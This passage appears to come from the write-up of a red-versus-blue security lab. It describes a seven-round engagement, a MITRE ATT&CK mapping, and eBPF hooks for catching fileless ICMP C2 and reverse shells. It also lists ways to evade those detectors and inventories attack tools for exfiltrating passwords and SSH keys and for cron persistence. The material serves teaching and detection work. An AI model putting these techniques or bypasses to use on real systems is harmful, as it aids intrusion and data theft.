- **Multi-source ingestion**: Reads `trap.log` (honeypot events) and `soc_events.jsonl` (eBPF alerts, iptables blocks)
- **HTTP POST API** (`/api/event`) for programmatic event submission by other tools
- **Statistics cards**: Total events, blocked IPs, process kills, critical alerts
- **Color-coded severity**: CRITICAL (red), HIGH (yellow), MEDIUM (blue), INFO (gray)
- **Auto-scroll event timeline** with most recent events at top

**Integration Points**:
- `honeypot.py` → writes to `trap.log` → dashboard polls and displays
- `blue_mdr_network.py --soc-log` → writes JSONL → dashboard polls and displays
- `blue_ebpf_mdr_v2.py --soc-log` → writes JSONL → dashboard polls and displays

---

## 6. 7-Round Iterative Engagement

The demonstration is structured as a 7-round engagement that illustrates the adversarial escalation between red and blue teams:

| Round | Actor | Action | Outcome | Key Insight |
|-------|-------|--------|---------|-------------|
| 1 | Red | Reconnaissance (nmap via `recon.sh`) | Discovers ports 2222 and 9999 | Attack surface mapping |
| 1b | Red → Blue | Honeypot trap triggered (port 2222) | Red team IP blocked via iptables | Cyber deception works |
| 1c | Red | IP alias bypass (`ip_switch.sh add`) | Regains network access with new IP | IP-based defense is insufficient |
| 2 | Red | SSTI + fileless C2 (`red_attacker.py`) | Full remote control via ICMP C2 | Fileless malware evades file-based detection |
| 3 | Blue | eBPF v1 deployed (`blue_ebpf_mdr.py --kill`) | Existing C2 agent killed; re-attacks blocked | Kernel-level detection works |
| 4 | Red | Re-attack with `red_attacker.py` | Blocked by eBPF v1 at `memfd_create` | Behavior-based detection is effective |
| 5 | Red | TCP reverse shell (`red_reverse_shell.py`) | Bypasses all 3 v1 hooks | Attackers adapt when blocked |
| 6 | Blue | eBPF v2 deployed (`blue_ebpf_mdr_v2.py --kill`) | Reverse shell detected via `connect` + `dup2/dup3` | Defenders must evolve too |
| 7 | Blue | SOC dashboard (`soc_dashboard.py`) | Unified visibility across all events | Operational awareness is essential |

**Core Lesson**: No single defense is sufficient. The iterative engagement demonstrates that cybersecurity is a continuous adversarial process, not a one-time deployment.

---

## 7. MITRE ATT&CK Mapping

### 7.1 Red Team Attack Techniques

| ID | Technique | Implementation |
|----|-----------|---------------|
| T1595 | Active Scanning | nmap port and service scanning via `recon.sh` |
| T1190 | Exploit Public-Facing Application | SSTI injection into Flask `/diag` endpoint |
| T1059.006 | Command & Scripting: Python | memfd loader, agent, reverse shell, exfil agent |
| T1620 | Reflective Code Loading | `memfd_create` → `execve` from `/proc/pid/fd` |
| T1027 | Obfuscated Files or Information | Double Base64 + AES-256-CTR encryption |
| T1140 | Deobfuscate/Decode | `base64 -d` pipeline in shell |
| T1095 | Non-Application Layer Protocol | ICMP echo request covert C2 channel |
| T1071.001 | Application Layer Protocol: Web | TCP reverse shell |
| T1036 | Masquerading | IP alias to bypass network-level blocking |
| T1048.003 | Exfiltration Over Alternative Protocol | DNS/ICMP data exfiltration |
| T1005 | Data from Local System | Exfil agent collects passwd, SSH keys, history |
| T1053.003 | Scheduled Task/Job: Cron | Crontab persistence (post_exploit.sh) |
| T1082 | System Information Discovery | whoami, uname, id via C2 shell |
| T1070.003 | Clear Command History | `history -c` during cleanup |
| T1070.004 | File Deletion | Exfil agent self-deletes after completion |

### 7.2 Blue Team Detection Coverage

| ID | Detection Surface | Hook/Mechanism | Version |
|----|-------------------|---------------|---------|
| T1620 | Reflective Code Loading | `sys_enter_memfd_create` tracepoint | v1 |
| T1059 | Execution from `/proc/fd` | `sys_enter_execve` filename pattern match | v1 |
| T1095 | Raw ICMP Socket | `sys_enter_socket(AF_INET, SOCK_RAW, ICMP)` | v1 |
| T1070 | Indicator Removal | `/proc/*/exe` cold-start scan for memfd processes | v1 |
| T1071.001 | Suspect Port Connect | `sys_enter_connect` port check | v2 |
| T1059.006 | Reverse Shell fd Hijack | `sys_enter_dup2/dup3` bitmask tracking | v2 |
| T1595 | Active Scanning | Honeypot trap on port 2222 | Network |
| -- | Known-Bad IP Blocking | `iptables -I INPUT 1 -s IP -j DROP` | Network |

---

## 8. Security Considerations and Limitations

### 8.1 Encryption Strength

AES-256-CTR with per-packet random IV provides strong confidentiality. However:
- The shared secret is hardcoded in both the C2 server and the embedded agent code
- Key derivation uses a single SHA-256 hash (no stretching via PBKDF2/Argon2)
- No authentication (AES-CTR is malleable; production systems require AES-GCM or ChaCha20-Poly1305)
- For this lab, the encryption strength is more than sufficient to demonstrate that payload inspection is futile and behavior-based detection is necessary

### 8.2 ICMP Channel Bandwidth

- ~480 bytes payload per ICMP packet
- With jitter delays (1.0--2.5 seconds per loop), effective throughput is extremely low
- Suitable for command/control, not for large data exfiltration
- Exfiltration is handled separately via DNS/ICMP channels with dedicated chunking protocols

### 8.3 eBPF Detection Bypass Possibilities

- **`shm_open()` instead of `memfd_create`**: Creates shared memory objects (requires additional hook)
- **`fexecve()` instead of `execve` with `/proc` path**: Direct execution from fd (requires additional hook)
- **`ptrace` injection**: Inject code into existing processes without execve (no current hook)
- **Non-standard reverse shell ports**: Using port 80/443 would bypass Hook 4 (but Hook 5/6 still catches it via dup2 pattern)
- **Mitigation**: Add more hook points, combine with seccomp-BPF, or deploy endpoint detection solutions

### 8.4 Honeypot Limitations

- Low-interaction honeypot: Only mimics SSH banner; does not accept authentication
- Sophisticated attackers may recognize the fake SSH service during fingerprinting
- Only detects active connections; passive reconnaissance (e.g., SYN scan without full connect) may not trigger logging

### 8.5 Lab vs Production Environment

- This lab assumes Flask runs as root (providing `CAP_NET_RAW` for ICMP)
- In production, web services run as low-privilege users; raw ICMP sockets would require additional privilege escalation
- eBPF detection should be part of a layered defense (EDR, SIEM, network monitoring), not a standalone solution
- The SOC dashboard is single-machine; production SOC systems aggregate data from hundreds of endpoints

---

## 9. Conclusion

This project demonstrates a complete Kill Chain attack-defense cycle across 7 rounds of adversarial engagement, covering 15 MITRE ATT&CK techniques with corresponding detection capabilities across two independent defense layers.

**Key Insights**:

1. **No single defense is sufficient.** Network-layer defenses (honeypot + iptables) can be bypassed by changing IP addresses. Kernel-layer defenses (eBPF v1) can be bypassed by using different syscall patterns (TCP reverse shell). Only the combination of multiple independent detection mechanisms provides robust protection.

2. **Attackers adapt, so defenders must evolve.** When eBPF v1 blocked the fileless ICMP C2, the red team pivoted to a standard TCP reverse shell that used none of the monitored syscalls. The blue team responded by deploying eBPF v2 with additional hooks for `connect()` and `dup2()/dup3()`, restoring detection capability. This cycle mirrors real-world security operations.

3. **Behavior-based detection transcends encryption.** Upgrading the C2 channel from XOR to AES-256-CTR made payload inspection impossible, yet eBPF detection remained fully effective because it monitors **syscall behavior** -- what the process does -- rather than what the traffic contains.

4. **Fileless techniques challenge traditional defenses.** By executing entirely in memory via `memfd_create`, the C2 agent leaves no filesystem artifacts for traditional antivirus or forensic tools to detect. This validates the need for kernel-level behavioral monitoring through technologies like eBPF.

5. **Operational visibility is essential.** The SOC dashboard provides unified situational awareness across all defensive components (honeypot, network MDR, eBPF v1/v2), enabling the blue team to understand the full attack picture rather than responding to isolated alerts.

6. **Cyber deception provides early warning.** The SSH honeypot on port 2222 provides zero-false-positive detection of reconnaissance activity, giving the blue team advance notice of an attack before the real target (port 9999) is engaged.

---

## 10. Complete Tool Inventory

### Red Team

| Tool | File | Purpose | Requires sudo |
|------|------|---------|--------------|
| Fileless ICMP C2 | `red_team/red_attacker.py` | SSTI → memfd_create → AES-256-CTR ICMP C2 | Yes (raw ICMP) |
| TCP Reverse Shell | `red_team/red_reverse_shell.py` | eBPF v1 bypass via standard TCP + dup2 + pty | No |
| WAF Bypass | `red_team/exploit.py` | Legacy WAF bypass (Base64 + `${IFS}`) | No |
| Exfil Agent | `red_team/exfil_agent.py` | Target-side DNS/ICMP data exfiltration | No |
| Exfil Listener | `red_team/exfil_listener.py` | Attacker-side data reassembly server | Yes (DNS port 53, raw ICMP) |
| Recon Script | `red_team/recon.sh` | Automated nmap scanning | Depends on scan type |
| IP Switch | `red_team/ip_switch.sh` | IP alias management for MDR bypass | Yes (ip addr) |
| Deploy Agent | `red_team/deploy_agent.sh` | Base64-encoded exfil agent deployment | No |
| Post-Exploit | `red_team/post_exploit.sh` | Post-exploitation enumeration and persistence | No |

### Blue Team

| Tool | File | Purpose | Requires sudo |
|------|------|---------|--------------|
| eBPF MDR v1 | `blue_team/blue_ebpf_mdr.py` | 3 hooks: memfd_create, execve, socket | Yes (eBPF) |
| eBPF MDR v2 | `blue_team/blue_ebpf_mdr_v2.py` | 6 hooks: + connect, dup2, dup3 | Yes (eBPF) |
| Network MDR | `blue_team/blue_mdr_network.py` | Honeypot trap monitor + iptables auto-block | Yes (iptables) |
| SOC Dashboard | `blue_team/soc_dashboard.py` | Real-time web UI aggregating all events | No |

### Target

| Tool | File | Purpose | Requires sudo |
|------|------|---------|--------------|
| Vulnerable API | `target/target_app.py` | Flask SSTI vulnerable diagnostic service (port 9999) | Recommended (low ports) |
| SSH Honeypot | `target/honeypot.py` | Fake SSH on port 2222, logs attacker IPs to trap.log | Recommended (low ports) |
